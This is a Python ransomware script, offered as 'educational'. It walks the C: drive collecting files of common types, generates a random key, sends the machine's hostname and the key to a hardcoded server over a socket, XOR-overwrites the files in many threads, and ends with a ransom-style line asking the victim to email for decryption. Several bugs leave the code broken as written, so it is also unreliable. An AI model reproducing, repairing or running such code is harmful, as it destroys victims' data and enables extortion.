#!/usr/bin python
# -*- coding: utf-8 -*-

# Disclimer 
"""This ransomware made for only educational purpose please don't use it for any bad purpose."""

# Import Modules
import os
import random
import socket
from datetime import datetime
from threading import Thread
from queue import Queue

# colors
reset = '\033[0m'
bold = '\033[01m'
red = '\033[31m'
green = '\033[32m'
blue = '\033[34m'


# take Permission after run
print(f"{bold}{green}\nThis ransomware script made for only educational purpose,{red}It can be harmfull for system,{green} please don't use it for any bad purpose.{reset}")
password = input(f"{bold}{blue}\n[~] Wanna run this malicious script (y/n): {reset}")
yesVar = "y" or "Y" or "yes" or "Yes"
if password != yesVar:
    quit()

# File Extentions
encryptionExtention = ('txt', 'jpg', "jpeg", "png", "apk", "mp3",
                       "mp4", "m4v", "html", "obt", "pdf", "js",
                       "php", "zip", "rar", "xlz", "obs", "ppt",
                       "jar", "xml", "iso", "exe", "io", "tcp",)


# Collect all files
filePaths = []
for root, dirs, files, in os.walk('c:\\'):
    for file in files:
        filePath, fileExt = os.path.splitext(root + "\\" + file)
        if fileExt in encryptionExtention:
            filePaths.append(root + "\\" + file)

# Define Variables
encryptionKeyVariable = ""
encryptionLevel = 128 // 8
carectorPool = ""

for i in range(0x00, 0xFF):
    carectorPool = carectorPool + (chr(i))

for i in range(encryptionLevel):
    encryptionKeyVariable = encryptionKeyVariable + random.choice(carectorPool)

# Get Hostname
hostname = os.getenv("COMPUTERNAME")


# connect ransomeware server and send encryption Key
internetProtocolAddress = "192.168.43.113"
portNumber = 8800
currentTime = datetime.now()

# Connect with server
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
    server.connect(internetProtocolAddress, portNumber)
    server.send(f'[{currentTime}] - {hostname} : {encryptionKeyVariable}'.encode('utf-8'))

# Encrypt files
queueVariable = Queue()

# Encryption Function
def encryptionFunction():
    while queueVariable.not_empty:
        file = queueVariable.get()
        indexVariable = 0
        maxIndex = encryptionLevel - 1
        try:
            with open(file, 'rb') as fi:
                dataVariable = fi.read()
            with open(file, 'wb') as fi:
                for byte in dataVariable:
                    XORbyte = byte ^ ord(encryptionKeyVariable[index])
                    fi.write(XORbyte.to_bytes(1, 'little'))
                    if index >= maxIndex:
                        index = 0
                    else:
                        index = index + i
        except:
            print(f"Failed to encrypt {file}")
        queueVariable.task_done()


try:
    for file in filePaths:
        queueVariable.put(file)
    for i in range(30):
        threadsNumber = Thread(target=encryptionFunction,
                               args=(encryptionKeyVariable,), daemon=True)
        threadsNumber.start()
except SyntaxError or RuntimeError or TypeError or KeyboardInterrupt:
    pass

# Last Information
emailAddress = "thenurhabib@gmail.com"
queueVariable.join()
print(f"{bold}{green}Encryption Was Successfull.")
print(f"{blue}Contact me for decrypt : {emailAddress}{reset}")
